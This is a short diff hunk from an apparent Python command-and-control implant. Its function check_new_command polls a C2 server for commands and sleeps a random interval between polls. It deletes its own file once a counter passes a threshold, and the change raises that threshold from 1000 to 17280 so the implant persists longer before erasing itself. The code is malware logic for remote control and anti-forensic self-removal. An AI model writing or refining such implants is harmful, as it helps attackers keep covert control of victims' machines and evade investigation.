@@ -62,7 +62,7 @@ def check_new_command(prev_output):
             command_counter += 1
             print('[-] No new commands from c2')
             n = random.randint(5,10)
-            if (command_counter > 1000):
+            if (command_counter > 17280):
                 os.remove(__file__)
             time.sleep(n)
 
